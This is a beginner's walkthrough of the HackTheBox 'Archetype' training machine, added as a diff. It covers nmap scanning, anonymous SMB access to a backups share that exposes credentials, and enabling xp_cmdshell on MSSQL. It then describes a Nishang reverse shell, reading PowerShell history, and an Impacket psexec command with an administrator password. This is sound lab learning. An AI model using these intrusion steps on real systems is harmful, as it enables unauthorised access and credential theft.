@@ -1,0 +1,49 @@
+This write-up will be on the Archetype box from HackTheBox. It is the first box in their Starting Point path which is supposed to allow you to “Play some of our easy machines to get a grasp on how Hack The Box works.” Now, they say these boxes are “very easy” but for those of us who are new, they can prove to be quite difficult yet extremely educational. I will attempt to note everything I do in order to pass along my understanding to the best of my ability, without further ado, let's get moving!
+
+If you are new to HTB, you can participate in their challenges through their built-in attack box or you can use OpenVPN to connect to their server from your own personalized attack box. Since I am also learning more about Kali Linux, I will be using my own virtual machine in order to develop a more in-depth understanding. 
+
+To connect: sudo openvpn /path/to/yourdownloaded/vpnfile
+
+Practicing active reconnaissance, I will be running two NMAP scans in order to get a basic understanding of the target machine. 
+  Basic Scan: nmap -sV -vv --open 10.10.10.27 -oN basic.nmap
+    -sV will tell nmap to show me the versions of the services running on the open ports
+    -vv will give me a verbose explanation of how the NSE is gathering the information.
+    --open will output the open ports
+    -oN will save the output into a specified file, in my case 'basic.nmap', I do this for quick reference in the future. 
+  Vulnerability Scan: nmap --script=vuln 10.10.10.27 -oN vuln.nmap
+  
+  The results of the scan was the following:
+    Open Ports: 135, 139, 445, 1433
+    Operating System: Windows (and Windows Server 2008)
+    1433: Microsoft SQL Server 2017
+    Vuln Scan: smb-vuln-ms08-067
+      --> Likely vulnerable to remote code execution (CVE 2008-4250)
+      
+Further enumerating on our possible vulenrability, I started with using smbclient.
+  Command: smbclient -N -L \\\\10.10.10.27\\
+  --> The output of this command shows ADMIN$, C$, IPC$, AND backups (with blank comment). This seemed out of place to me, so I ran a more specific command. 
+  Command: smbclient -N \\\\10.10.10.27\\backups
+  --> I gained access to the backups directory, and discovered a file named 'prod.dtsConfig' and downloaded it using the get command. After reading through the file, I discovered a password and user ID. 
+  
+Now having credentials and an open port to a SQL server, I tried using Impacket's mssqlclient. 
+  Command: sudo python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
+  --> After using our obtained password, we gained access to the SQL server. After trying a few commands like whoami, pwd (print working directory), and ls/dir I discovered I  was on the server but had no idea what to do next. MORE RESEARCH. After looking around, I found out that I needed to configure my privileges within the server to gain a      reverse shell. The following steps allowed me to discover my “whoami” and do some basic privilege escalation. 
+	>EXEC sp_configure 'show advanced options', 1;
+		reconfigure
+		sp_configure
+		EXEC sp_configure 'xp_cmdshell', 1; 
+		reconfigure
+		xp_cmdshell "whoami"
+    
+Now it is time for privelege escalation. From here, we need to use our new found privilege with xp_cmdshell to download our reverse shell script. In order to do this we need to serve up our file on a local server and set up a Netcat listening port to catch the shell once we execute it. Now you could use python -m to set up a SimpleHTTPServer, but I have discovered a new tool that is much easier. To serve up my file, I used Updog. It is important to note that you need to run the server command inside of the directory that your script is located in. 
+
+For this box, I decided to use Nishang's Invoke-PowershellTCPOneLine.ps1 and after cleaning it up, I made sure to change the IP to my own and renamed it to script.ps1
+
+We are currently in the directory C:\Windows\system32 with user privileges so we can search for the User flag first. I navigated to Users\sql_svc\Desktop in order to complete this step. Once you have found the user flag, it is time for some privesc. 
+
+Right now, we are in a service account calleds sql_svc. I have found it to be good practice to check recently accessed files/executed commands. Mostly (or default) the console history will be saved in C:\Users\<accountname>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt
+
+This shows that the backup share is mapped with admin credentials. At first I did not know what to do with this information, but after MORE RESEARCH, I found out that now is a great time to use Impacket's psexec.py script. 
+The command is: python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:MEGACORP_4dm1n\!\!@10.10.10.27
+
+FINALLY. We now have root (admin) privileges. Now all we need to do is navigate to the admin Desktop and see if the root flag is there. What do you know, It was ;).
